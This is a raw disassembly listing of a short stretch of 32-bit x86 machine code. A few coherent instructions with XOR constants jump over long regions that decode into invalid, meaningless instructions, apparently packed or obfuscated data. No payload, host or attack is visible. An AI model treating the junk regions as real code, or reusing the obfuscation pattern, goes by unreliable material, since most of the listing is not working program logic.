  40c373:	mov    edx,DWORD PTR ds:0x422538
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42274c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	nop
  40c3d1:	retf   
  40c3d2:	aad    0xbc
  40c3d4:	or     eax,0x6e1818fd
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [eax+0x1ee1fd16],ah
  40c3e1:	jno    0x40c3f3
  40c3e3:	popa   
  40c3e4:	int    0x6f
  40c3e6:	mov    fs,WORD PTR [edi-0x41]
  40c3e9:	out    dx,al
  40c3ea:	dec    ebx
  40c3eb:	jb     0x40c40d
  40c3ed:	arpl   WORD PTR [ebp+0x2254f3ed],cx
  40c3f3:	cdq    
  40c3f4:	rcr    al,1
  40c3f6:	or     edx,DWORD PTR [esi-0x46]
  40c3f9:	inc    ebx
  40c3fa:	mov    al,0x59
  40c3fc:	fstp   TBYTE PTR [edi+0x6b37221c]
  40c402:	aad    0x1a
  40c404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c405:	lds    eax,FWORD PTR [esi-0x4f4df45a]
  40c40b:	or     edx,DWORD PTR [edx]
  40c40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c40e:	mov    esp,0x95851bd6
  40c413:	into   
  40c414:	ins    DWORD PTR es:[edi],dx
  40c415:	pop    ebp
  40c416:	shl    bl,cl
  40c418:	bound  ebx,QWORD PTR [eax-0x74]
  40c41b:	fs hlt 
  40c41d:	xor    ax,0x7e64
  40c421:	fistp  QWORD PTR [edx+0x1891be4]
  40c427:	aaa    
  40c428:	jmp    0x52d1e8e9
  40c42d:	mov    cl,0xef
  40c42f:	jp     0x40c495
  40c431:	pop    esp
  40c432:	sahf   
  40c433:	daa    
  40c434:	popf   
  40c435:	icebp  
  40c436:	dec    esi
  40c437:	test   edx,ebp
  40c439:	pop    eax
  40c43a:	fucomp st(4)
  40c43c:	mov    edi,0xd8cb7c4b
  40c441:	arpl   WORD PTR [ebp-0x1b],bp
  40c444:	mov    WORD PTR [ebx+eax*4],ds
  40c447:	imul   ecx,edi,0x14ab2c94
  40c44d:	jns    0x40c416
  40c44f:	xchg   ecx,eax
  40c450:	cmc    
  40c451:	jge    0x40c491
  40c453:	pop    eax
  40c454:	ror    DWORD PTR [ebp-0x3ebd23b0],1
  40c45a:	ret    
  40c45b:	ja     0x40c466
  40c45d:	pop    ds
  40c45e:	push   esi
  40c45f:	mov    esi,0x17a6d294
  40c464:	pushf  
  40c465:	add    esi,ebx
  40c467:	or     DWORD PTR [esp+ebx*2-0x6675da26],esp
  40c46e:	std    
  40c46f:	test   BYTE PTR [esi-0x35],cl
  40c472:	xor    cl,cl
  40c474:	aaa    
  40c475:	fnstsw WORD PTR [ecx]
  40c477:	in     al,0x33
  40c479:	rcr    DWORD PTR [edi],cl
  40c47b:	scas   al,BYTE PTR es:[edi]
  40c47c:	out    0x75,eax
  40c47e:	cld    
  40c47f:	pop    edx
  40c480:	push   eax
  40c481:	ins    BYTE PTR es:[edi],dx
  40c482:	(bad)  
  40c483:	and    eax,0x16de33b2
  40c488:	xor    al,0x45
  40c48a:	in     eax,0x45
  40c48c:	aas    
  40c48d:	ins    BYTE PTR es:[edi],dx
  40c48e:	js     0x40c454
  40c490:	jne    0x40c500
  40c492:	and    al,0x8
  40c494:	cmc    
  40c495:	adc    dl,bh
  40c497:	mov    edi,0x98ee6afd
  40c49c:	or     esp,DWORD PTR [edi+0x35]
  40c49f:	add    BYTE PTR [ebp-0x79],bh
  40c4a2:	lea    edi,[ebx+eiz*2-0x252564aa]
  40c4a9:	aad    0xe8
  40c4ab:	(bad)  
  40c4ad:	pop    ss
  40c4ae:	pop    edi
  40c4af:	pop    ecx
  40c4b0:	cmp    esp,edi
  40c4b2:	jecxz  0x40c513
  40c4b4:	shl    BYTE PTR [ecx],cl
  40c4b6:	adc    DWORD PTR [esi-0x4879ab7a],ebx
  40c4bc:	adc    dl,BYTE PTR [ebp+0x54]
  40c4bf:	jmp    0x40c535
  40c4c1:	or     ah,BYTE PTR [ecx+eax*2]
  40c4c4:	xchg   esp,eax
  40c4c5:	lds    ebx,FWORD PTR [edi+0xb]
  40c4c8:	push   0xb2474e1b
  40c4cd:	jmp    0x40c4ae
  40c4cf:	jb     0x40c547
  40c4d1:	loopne 0x40c46c
  40c4d3:	cmp    ebp,ebx
  40c4d5:	xchg   ecx,eax
  40c4d6:	cmp    ch,ch
  40c4d8:	dec    esp
  40c4d9:	dec    edi
  40c4da:	jnp    0x40c523
  40c4dc:	adc    esp,ebx
  40c4de:	jns    0x40c51a
  40c4e0:	retf   0x327a
  40c4e3:	mov    ebx,0x2576d56c
  40c4e8:	je     0x40c49e
  40c4ea:	jns    0x40c4b5
  40c4ec:	outs   dx,DWORD PTR ds:[esi]
  40c4ed:	test   eax,0x40b43b3b
  40c4f2:	mov    ah,0x7f
  40c4f4:	int    0xff
  40c4f6:	out    0x68,eax
  40c4f8:	es dec edi
  40c4fa:	jae    0x40c572
  40c4fc:	add    eax,DWORD PTR [esi-0x410c5a9b]
  40c502:	sub    al,0x12
  40c504:	cmp    eax,0x537ba0f9
  40c509:	and    al,0x27
  40c50b:	cdq    
  40c50c:	xchg   edi,eax
  40c50d:	jo     0x40c4b3
  40c50f:	jmp    0x40c577
  40c511:	jmp    0xf47c:0xdc5b789f
  40c518:	cmp    eax,0x80c368d4
  40c51d:	stos   BYTE PTR es:[edi],al
  40c51e:	mov    bl,al
  40c520:	dec    eax
  40c521:	sub    esi,DWORD PTR [eax]
  40c523:	rol    BYTE PTR [ebx-0x39],0x33
  40c527:	cwde   
  40c528:	jmp    0x40c598
  40c52a:	sbb    esp,ecx
  40c52c:	xor    ah,BYTE PTR [edx-0x5ed434b2]
  40c532:	sar    DWORD PTR [edi+0x3a],0x4
  40c536:	pop    edi
  40c537:	xor    al,0x95
  40c539:	cdq    
  40c53a:	xchg   ecx,eax
  40c53b:	adc    al,0xb1
  40c53d:	mov    dh,0x19
  40c53f:	outs   dx,BYTE PTR ds:[esi]
  40c540:	(bad)  
  40c541:	cli    
  40c542:	enter  0x5e9,0xcb
  40c546:	mov    esp,0x8bf7dce3
  40c54b:	push   cs
  40c54c:	clc    
  40c54d:	adc    esp,DWORD PTR [esi+0x2b]
  40c550:	and    DWORD PTR [esi-0x709c9f3],edi
  40c556:	test   DWORD PTR [ebx+0x6a],esi
  40c559:	add    DWORD PTR [esi+0x3c],eax
  40c55c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c55d:	ds scas eax,DWORD PTR es:[edi]
  40c55f:	hlt    
  40c560:	mov    ebp,0x4478a09c
  40c565:	and    bh,BYTE PTR [eax]
  40c567:	stos   BYTE PTR es:[edi],al
  40c568:	push   eax
  40c569:	in     al,0x7f
  40c56b:	arpl   bp,bx
  40c56d:	test   al,0xb0
  40c56f:	ret    
  40c570:	(bad)  
  40c571:	jo     0x40c543
  40c573:	stc    
  40c574:	jo     0x40c4fd
  40c576:	fcom   DWORD PTR [eax+eax*8+0x1d]
  40c57a:	repnz and eax,0x19caf06c
  40c580:	dec    ebp
  40c581:	test   eax,0x7b1b72f9
  40c586:	fwait
  40c587:	or     ch,BYTE PTR [edi]
  40c589:	ja     0x40c58d
  40c58b:	xchg   ecx,eax
  40c58c:	das    
  40c58d:	xchg   BYTE PTR [edi-0x2cbcebb1],ah
  40c593:	es scas eax,DWORD PTR es:[edi]
  40c595:	das    
  40c596:	jecxz  0x40c58c
  40c598:	test   DWORD PTR [ebx-0x4f],edx
  40c59b:	sahf   
  40c59c:	push   edi
  40c59d:	aaa    
  40c59e:	xchg   BYTE PTR ds:0x62a2bb84,bh
  40c5a4:	jo     0x40c52a
  40c5a6:	push   0x7c5153a1
  40c5ab:	and    BYTE PTR [edi],bl
  40c5ad:	adc    BYTE PTR [eax-0x1a],bl
  40c5b0:	sub    ebp,ecx
  40c5b2:	sub    bl,dh
  40c5b4:	xor    eax,0xab7f0846
  40c5b9:	or     esi,DWORD PTR [ebp+0x3c9e592e]
  40c5bf:	bound  esi,QWORD PTR [eax+0x2]
  40c5c2:	out    0x57,eax
  40c5c4:	imul   ecx,DWORD PTR [ebx-0x5ac7433b],0xffffff8a
  40c5cb:	mov    al,0x8e
  40c5cd:	push   eax
  40c5ce:	repnz push ds
  40c5d0:	adc    dl,BYTE PTR [eax]
  40c5d2:	lods   al,BYTE PTR ds:[esi]
  40c5d3:	mov    edi,0xe8b5c48c
  40c5d8:	push   es
  40c5d9:	lock sub al,0xa4
  40c5dc:	out    0x9b,al
  40c5de:	std    
  40c5df:	mov    dh,0x68
  40c5e1:	lea    esi,[ebp-0x4b]
  40c5e4:	lods   eax,DWORD PTR ds:[esi]
  40c5e5:	int3   
  40c5e6:	dec    edx
  40c5e7:	sub    BYTE PTR [edi-0x32],ah
  40c5ea:	lahf   
  40c5eb:	jmp    0x40c5fb
  40c5ed:	(bad)  
  40c5ee:	cmp    al,0xb1
  40c5f0:	lock pop es
  40c5f2:	fisttp QWORD PTR [eax+0x1d922f8c]
  40c5f8:	cwde   
  40c5f9:	mov    ch,0x34
  40c5fb:	and    DWORD PTR [eax],edi
  40c5fd:	pusha  
  40c5fe:	push   0x7
  40c600:	add    bl,BYTE PTR [edi]
  40c602:	addr16 mov al,0x43
  40c605:	jecxz  0x40c682
  40c607:	and    ebx,DWORD PTR [ebx-0x51ca4934]
  40c60d:	imul   esi,DWORD PTR [ebx],0x9acdf3e
  40c613:	add    DWORD PTR [edx+ecx*4-0x2cbc153a],esi
  40c61a:	mov    ecx,ds
  40c61c:	mov    ds:0x69033186,al
  40c621:	jle    0x40c659
  40c623:	or     eax,0xae017e6f
  40c628:	inc    eax
  40c629:	shl    ebp,cl
  40c62b:	and    eax,0xb6b7221
  40c630:	add    BYTE PTR [esi-0x4e],bh
  40c633:	pop    esi
  40c634:	ins    DWORD PTR es:[edi],dx
  40c635:	cmc    
  40c636:	ins    DWORD PTR es:[edi],dx
  40c637:	mov    ebp,0x17ca82aa
  40c63c:	es loop 0x40c5ee
  40c63f:	scas   eax,DWORD PTR es:[edi]
  40c640:	push   esp
  40c641:	(bad)  
  40c643:	cld    
  40c644:	es fxtract 
  40c647:	pop    ss
  40c648:	outs   dx,DWORD PTR ds:[esi]
  40c649:	arpl   di,ax
  40c64b:	add    BYTE PTR [ecx-0x4c0b20bc],dl
  40c651:	pushf  
  40c652:	mov    eax,ds:0x2a654118
  40c657:	xor    ah,bh
  40c659:	(bad)  [eax+ecx*8-0x53]
  40c65d:	adc    DWORD PTR [edx],ebp
  40c65f:	nop
  40c660:	daa    
  40c661:	jae    0x40c6bf
  40c663:	xor    ch,ch
  40c665:	jne    0x40c623
  40c667:	jle    0x40c5eb
  40c669:	gs sahf 
  40c66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c66d:	es repz (bad) 
  40c670:	sub    dl,BYTE PTR [esi+0x4ab81a32]
  40c676:	xchg   ebx,eax
  40c677:	ins    DWORD PTR es:[edi],dx
  40c678:	add    bl,BYTE PTR [edx]
  40c67a:	push   0x7d4b26fa
  40c67f:	xor    al,al
  40c681:	mov    bl,0xfc
  40c683:	mov    esi,0x11b50478
  40c688:	xor    edx,esi
  40c68a:	shl    BYTE PTR [edi-0x25],0xce
  40c68e:	es inc ebp
  40c690:	lods   al,BYTE PTR ss:[esi]
  40c692:	mov    edx,0x474b9a6e
  40c697:	xor    eax,0xb2141286
  40c69c:	daa    
  40c69d:	cld    
  40c69e:	in     eax,0xd
  40c6a0:	dec    esi
  40c6a1:	pop    ds
  40c6a2:	xchg   esp,eax
  40c6a3:	adc    DWORD PTR [edx],esp
  40c6a5:	push   eax
  40c6a6:	add    ch,BYTE PTR [eax+0x54]
  40c6a9:	mov    DWORD PTR ds:0x5a7c16ce,esi
  40c6af:	dec    esp
  40c6b0:	pop    ss
  40c6b1:	dec    eax
  40c6b2:	push   es
  40c6b3:	or     dh,BYTE PTR [ebp-0x35]
  40c6b6:	jnp    0x40c64f
  40c6b8:	cmp    BYTE PTR [ebx+eax*4-0x2c],bh
  40c6bc:	jmp    0xd127:0xd8b7a90b
  40c6c3:	(bad)  
  40c6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c5:	mov    eax,0x50054e90
  40c6ca:	xchg   ebp,eax
  40c6cb:	je     0x40c697
  40c6cd:	std    
  40c6ce:	dec    esp
  40c6cf:	aam    0x3e
  40c6d1:	inc    edx
  40c6d2:	fwait
  40c6d3:	ja     0x40c724
  40c6d5:	jmp    0x40c671
  40c6d7:	arpl   sp,cx
  40c6d9:	pop    edi
  40c6da:	stos   BYTE PTR es:[edi],al
  40c6db:	xchg   esp,eax
  40c6dc:	and    BYTE PTR [ecx-0x65ca677a],dh
  40c6e2:	sub    eax,ebp
  40c6e4:	add    DWORD PTR [ebp-0x2f],ebx
  40c6e7:	fwait
  40c6e8:	daa    
  40c6e9:	or     ch,0x9c
  40c6ec:	dec    ecx
  40c6ed:	and    al,0x95
  40c6ef:	in     eax,dx
  40c6f0:	jne    0x40c6c3
  40c6f2:	test   DWORD PTR [ebp-0x45],edx
  40c6f5:	sar    DWORD PTR [edi],1
  40c6f7:	call   0xf6bd:0xee194ffb
  40c6fe:	or     ecx,edx
  40c700:	sbb    esi,ebp
  40c702:	(bad)  
  40c703:	fsubr  st,st(2)
  40c705:	aam    0x70
  40c707:	cmp    edx,DWORD PTR [edx]
  40c709:	mov    ah,0x6b
  40c70b:	stos   DWORD PTR es:[edi],eax
  40c70c:	and    eax,0xcf433a56
  40c711:	and    BYTE PTR [edi],bh
  40c713:	in     al,0x4b
  40c715:	cmp    DWORD PTR [ebx],eax
  40c717:	loopne 0x40c798
  40c719:	in     eax,0x1d
  40c71b:	rol    DWORD PTR [ecx],0xec
  40c71e:	pop    edx
  40c71f:	jp     0x40c73e
  40c721:	(bad)
  40c724:	loope  0x40c6a7
  40c726:	add    eax,0x9874debf
  40c72b:	loopne 0x40c6d4
  40c72d:	call   0xa09ea867
  40c732:	and    al,0x33
  40c734:	lds    edi,FWORD PTR [eax+0x5b6f385b]
  40c73a:	cld    
  40c73b:	push   0xf0049fb
  40c740:	mov    ecx,0x6fc97299
  40c745:	cmp    ah,BYTE PTR [eax+0x54]
  40c748:	add    ah,BYTE PTR [ebx-0x3296a4dd]
  40c74e:	push   0x9303176a
  40c753:	pop    esp
  40c754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c755:	dec    ebp
  40c756:	dec    esi
  40c757:	(bad)
  40c75a:	inc    esi
  40c75b:	lods   al,BYTE PTR ds:[esi]
  40c75c:	add    DWORD PTR [ecx],ebx
  40c75e:	cmp    ebp,DWORD PTR [ebp+0xc]
  40c761:	ins    BYTE PTR es:[edi],dx
  40c762:	xlat   BYTE PTR ds:[ebx]
  40c763:	or     eax,0x7b8dfcfd
  40c768:	inc    esi
  40c769:	arpl   WORD PTR [edx+edx*8+0x7396cca3],cx
  40c770:	xchg   edx,eax
  40c771:	aaa    
  40c772:	sar    DWORD PTR [ecx-0x45],cl
  40c775:	shl    DWORD PTR [eax],0xd
  40c778:	push   0xb5f218dc
  40c77d:	mov    BYTE PTR [ebx-0x10],ch
  40c780:	jnp    0x40c7eb
  40c782:	push   esp
  40c783:	xor    DWORD PTR [ebx],ebx
  40c785:	sub    al,0xda
  40c787:	je     0x40c7a3
  40c789:	pop    ecx
  40c78a:	xor    esp,DWORD PTR cs:[edi+0xc54a4e2]
  40c791:	jae    0x40c7c4
  40c793:	test   al,0x6
  40c795:	add    bl,BYTE PTR [eax-0x71]
  40c798:	dec    ecx
  40c799:	mov    edi,0x95c20d2e
  40c79e:	inc    ebx
  40c79f:	mov    edx,0x111b5bc
  40c7a4:	pop    ebx
  40c7a5:	rcr    cl,cl
  40c7a7:	je     0x40c72a
  40c7a9:	mov    dh,0x35
  40c7ab:	repz pop ds
  40c7ad:	cmp    eax,0x2a1490c6
  40c7b2:	xor    ecx,edi
  40c7b4:	and    dh,BYTE PTR [edx+eax*2]
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi+0x611e4a70]
  40c7fd:	jo     0x40c862
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [edi-0x2cd1d0b9],dh
  40c80b:	inc    esi
  40c80c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c80d:	push   edi
  40c80e:	cmp    cl,bh
  40c810:	stc    
  40c811:	jb     0x40c825
  40c813:	(bad)  
  40c814:	in     al,dx
  40c815:	in     eax,dx
  40c816:	dec    edi
  40c817:	lods   eax,DWORD PTR ds:[esi]
  40c818:	(bad)  
  40c819:	pop    ds
  40c81a:	sar    DWORD PTR [eax],cl
  40c81c:	jo     0x40c83e
  40c81e:	mov    ?,WORD PTR [ebx]
  40c820:	dec    esi
  40c821:	fwait
  40c822:	adc    edx,ebp
  40c824:	or     al,0xa0
  40c826:	(bad)  [ecx-0x24]
  40c829:	or     eax,0x3bd5c799
  40c82e:	into   
  40c82f:	and    ah,ch
  40c831:	imul   BYTE PTR [ecx-0x2d3268dd]
  40c837:	je     0x40c87b
  40c839:	push   0x74
  40c83b:	jecxz  0x40c87d
  40c83d:	shl    edx,0x6e
  40c840:	pop    es
  40c841:	jl     0x40c800
  40c843:	cmp    BYTE PTR [eax],cl
  40c845:	int    0xc3
  40c847:	mov    edx,0x977aa6b1
  40c84c:	ins    BYTE PTR es:[edi],dx
  40c84d:	dec    edi
  40c84e:	push   eax
  40c84f:	(bad)  
  40c850:	jmp    0xbd5c667e
  40c855:	in     eax,dx
  40c856:	inc    edx
  40c857:	ss cli 
  40c859:	(bad)  [edx-0x494231bd]
  40c85f:	clc    
  40c860:	mov    dl,0x5
  40c862:	xor    dl,dl
  40c864:	push   ds
  40c865:	sub    ch,BYTE PTR [edx+0x7d3994b9]
  40c86b:	(bad)  
  40c86c:	fisttp WORD PTR [edx+0x63482dbe]
  40c872:	sub    esi,DWORD PTR [ecx-0x65c6dbe]
  40c878:	ret    
  40c879:	aam    0x4e
  40c87b:	jmp    0xefb7:0xe61adbec
  40c882:	mov    esi,0x369fdaf2
  40c887:	fild   WORD PTR [ecx-0x29066149]
  40c88d:	xchg   edx,eax
  40c88f:	std    
  40c890:	mov    eax,0x70a94067
  40c895:	sub    ebp,DWORD PTR [ebp+0xa7ff1d4]
  40c89b:	xchg   edx,eax
  40c89c:	adc    bl,dh
  40c89e:	bound  esp,QWORD PTR [edi+0x21]
  40c8a1:	daa    
  40c8a2:	mov    cl,0x38
  40c8a4:	dec    eax
  40c8a5:	cwde   
  40c8a6:	into   
  40c8a7:	jmp    0x85cc3d7b
  40c8ac:	and    BYTE PTR [edi-0x20],dl
  40c8af:	ins    BYTE PTR es:[edi],dx
  40c8b0:	mov    esi,DWORD PTR [esi+edx*1+0x3089a690]
  40c8b7:	sbb    ch,0x63
  40c8ba:	inc    edx
  40c8bb:	cmp    edi,DWORD PTR [eax+0x3a]
  40c8be:	add    bh,bl
  40c8c0:	outs   dx,DWORD PTR ds:[esi]
  40c8c1:	ins    DWORD PTR es:[edi],dx
  40c8c2:	add    bh,BYTE PTR [ebp+0x6263962f]
  40c8c8:	xchg   DWORD PTR [edi+0x45ff7d6d],ebx
  40c8ce:	push   eax
  40c8cf:	add    BYTE PTR [esi-0x53],0xa3
  40c8d3:	nop
  40c8d4:	out    dx,al
  40c8d5:	push   ecx
  40c8d6:	out    0x0,eax
  40c8d8:	popf   
  40c8d9:	sub    ebx,edx
  40c8db:	mov    bh,0x43
  40c8dd:	int3   
  40c8de:	push   ecx
  40c8df:	sub    edx,DWORD PTR [ecx]
  40c8e1:	sbb    edx,DWORD PTR [eax-0x69]
  40c8e4:	xor    ch,dh
  40c8e6:	(bad)  [ebx+0x4]
  40c8e9:	xor    ebp,DWORD PTR es:[eax-0x5b]
  40c8ed:	add    al,0x18
  40c8ef:	jp     0x40c8ec
  40c8f1:	inc    edx
  40c8f2:	or     DWORD PTR [ecx-0xe],ebx
  40c8f5:	test   dh,dh
  40c8f7:	or     al,0x1f
  40c8f9:	dec    ebx
  40c8fa:	cmp    al,0x93
  40c8fc:	retf   
  40c8fd:	pusha  
  40c8fe:	call   0x8b164aae
  40c903:	js     0x40c947
  40c905:	imul   ebx,ebp,0xffffffc2
  40c908:	(bad)  [eax-0x6]
  40c90b:	lea    esp,[edx+0x6025825e]
  40c911:	ss add BYTE PTR es:[eax+0x13b75c5d],0x47
  40c91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c91b:	fdivp  st(0),st
  40c91d:	cmp    DWORD PTR [esi],0xea9ad981
  40c923:	xchg   ecx,eax
  40c924:	mov    bl,0xa7
  40c926:	dec    edx
  40c927:	cmp    edi,esp
  40c929:	in     al,0x40
  40c92b:	and    edi,DWORD PTR [edi+0x7184eb3e]
  40c931:	nop
  40c932:	jne    0x40c941
  40c934:	pop    edi
  40c935:	xchg   esi,eax
  40c936:	lea    eax,[ebp+0x6a7a5316]
  40c93c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c93d:	mov    ebx,0xf7e2ef4f
  40c942:	lock in al,0xde
  40c945:	push   ss
  40c946:	mov    ebp,0x8c827910
  40c94b:	loope  0x40c99a
  40c94d:	dec    esi
  40c94e:	inc    ebx
  40c94f:	mov    dl,0x7c
  40c951:	fimul  WORD PTR [ecx+ebp*8+0x4fd1c88d]
  40c958:	scas   eax,DWORD PTR es:[edi]
  40c959:	ins    BYTE PTR es:[edi],dx
  40c95a:	stos   BYTE PTR es:[edi],al
  40c95b:	dec    esi
  40c95c:	test   BYTE PTR [esi-0x41974595],0xc1
  40c963:	iret   
  40c964:	ret    
  40c965:	es push ss
  40c967:	jns    0x40c90d
  40c969:	mov    ecx,0xc4f0745b
  40c96e:	shl    bl,1
  40c970:	mov    ds:0xba1f82c3,eax
  40c975:	push   ecx
  40c976:	pop    esi
  40c977:	sbb    ah,BYTE PTR [edx-0x7d]
  40c97a:	dec    edi
  40c97b:	in     al,dx
  40c97c:	mov    ch,0x5c
  40c97e:	into   
  40c97f:	dec    edi
  40c980:	cli    
  40c981:	les    edi,FWORD PTR [esi-0x7aaed4ee]
  40c987:	jmp    0x2e87:0x7dc24b28
  40c98e:	sbb    eax,0xdd877644
  40c993:	in     al,dx
  40c994:	adc    BYTE PTR [ecx+edi*4-0x6e4ab51b],bh
  40c99b:	mov    BYTE PTR [edx],ch
  40c99d:	daa    
  40c99e:	fdivp  st(2),st
  40c9a0:	pop    ebp
  40c9a1:	fmul   DWORD PTR [eax-0x3f68e4f0]
  40c9a7:	add    ebx,DWORD PTR [eax]
  40c9a9:	fwait
  40c9aa:	outs   dx,BYTE PTR ds:[esi]
  40c9ab:	fidiv  DWORD PTR [esi+0x2e3bed27]
  40c9b1:	loope  0x40c9be
  40c9b3:	mov    DWORD PTR [esi+eax*2-0x7d],ecx
  40c9b7:	sbb    cl,bh
  40c9b9:	ret    0xf95d
  40c9bc:	lods   eax,DWORD PTR ds:[esi]
  40c9bd:	xor    BYTE PTR [ebx+0x47],bl
  40c9c0:	dec    esi
  40c9c1:	jge    0x40ca39
  40c9c3:	inc    esi
  40c9c4:	mov    eax,ds:0x85e19951
  40c9c9:	fadd   DWORD PTR [ebx+0x76]
  40c9cc:	addr16 aaa 
  40c9ce:	(bad)  
  40c9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9d0:	into   
  40c9d1:	fimul  WORD PTR ss:[ecx+esi*4-0x2a]
  40c9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d7:	cmp    DWORD PTR [edi+0x20],ebp
  40c9da:	call   0x6576d32c
  40c9df:	mov    ebx,0x99a479fa
  40c9e4:	pushf  
  40c9e5:	in     eax,0xd6
  40c9e7:	add    BYTE PTR [eax],cl
  40c9e9:	xlat   BYTE PTR ds:[ebx]
  40c9ea:	xor    ecx,ebx
  40c9ec:	cmp    eax,0x549fb00f
  40c9f1:	shl    DWORD PTR ds:0x23db44a,0x43
  40c9f8:	mov    cs,ebp
  40c9fa:	xchg   BYTE PTR [eax+0x50],ah
  40c9fd:	sub    edx,DWORD PTR [edx+0x38]
  40ca00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca01:	xchg   edi,eax
  40ca02:	lahf   
  40ca03:	daa    
  40ca04:	and    dl,BYTE PTR [esi]
  40ca06:	mov    WORD PTR [edx-0x3f],cs
  40ca09:	mov    eax,ds:0x48802367
  40ca0e:	jmp    0x9bf4:0xc9fb2935
  40ca15:	hlt    
  40ca16:	loopne 0x40ca31
  40ca18:	jmp    0x40ca43
  40ca1a:	aam    0x51
  40ca1c:	mov    ebx,0xcab7f95a
  40ca21:	pop    esp
  40ca22:	push   esp
  40ca23:	loop   0x40ca2c
  40ca25:	push   ecx
  40ca26:	leave  
  40ca27:	cmp    BYTE PTR [ebx],bh
  40ca29:	or     ah,BYTE PTR [edi]
  40ca2b:	add    BYTE PTR [edx+0x656e4aa8],al
  40ca31:	rol    BYTE PTR [esi+edi*1+0x7e018fbc],1
  40ca38:	lea    edi,[edi+0x79]
  40ca3b:	pop    es
  40ca3c:	adc    BYTE PTR [edi+ebp*2],cl
  40ca3f:	test   al,0xfc
  40ca41:	pop    ds
  40ca42:	lods   eax,DWORD PTR ds:[esi]
  40ca43:	jb     0x40ca7d
  40ca45:	fisttp DWORD PTR [ebp+ecx*4-0x440b9e4d]
  40ca4c:	pop    es
  40ca4d:	xchg   ecx,eax
  40ca4e:	pop    edx
  40ca4f:	in     eax,0xde
  40ca51:	sar    BYTE PTR [edx+esi*1+0x50],cl
  40ca55:	dec    edi
  40ca56:	mov    ebp,0xb0a74a4b
  40ca5b:	mov    eax,ds:0x75f7be1c
  40ca60:	call   0xf6db:0x3cf7dfcc
  40ca67:	mov    esi,0x57e8e0a4
  40ca6c:	shl    eax,cl
  40ca6e:	jnp    0x40ca32
  40ca70:	out    dx,eax
  40ca71:	adc    eax,0xc7993ce2
  40ca76:	pop    eax
  40ca77:	push   edx
  40ca78:	mov    bl,0x2d
  40ca7a:	cdq    
  40ca7b:	sbb    DWORD PTR [edi-0x4cc6778],0xf93440a3
  40ca85:	imul   ecx,DWORD PTR [esi+eiz*2-0x7c],0xbde9c7aa
  40ca8d:	jp     0x40ca6d
  40ca8f:	jl     0x40ca31
  40ca91:	outs   dx,BYTE PTR ds:[esi]
  40ca92:	popa   
  40ca93:	arpl   WORD PTR ds:0x44430270,bp
  40ca99:	mov    ebx,0xc84bf321
  40ca9e:	mov    BYTE PTR [edx],ah
  40caa0:	jmp    0x4632cc8b
  40caa5:	inc    ebp
  40caa6:	sbb    ebx,DWORD PTR [ebp-0x35]
  40caa9:	scas   eax,DWORD PTR es:[edi]
  40caaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caab:	xor    DWORD PTR [ebx],ebx
  40caad:	lock outs dx,DWORD PTR ds:[esi]
  40caaf:	pop    esp
  40cab0:	push   es
  40cab1:	icebp  
  40cab2:	retf   
  40cab3:	jmp    0x40cadb
  40cab5:	mov    bl,0x9d
  40cab7:	mov    ebp,0x87af06a3
  40cabc:	repnz (bad) 
  40cabe:	lods   eax,DWORD PTR ds:[esi]
  40cabf:	mov    cl,BYTE PTR [esi-0x23]
  40cac2:	and    bl,0xb4
  40cac5:	imul   DWORD PTR ds:0xf03d4a35
  40cacb:	mov    dh,BYTE PTR [edi]
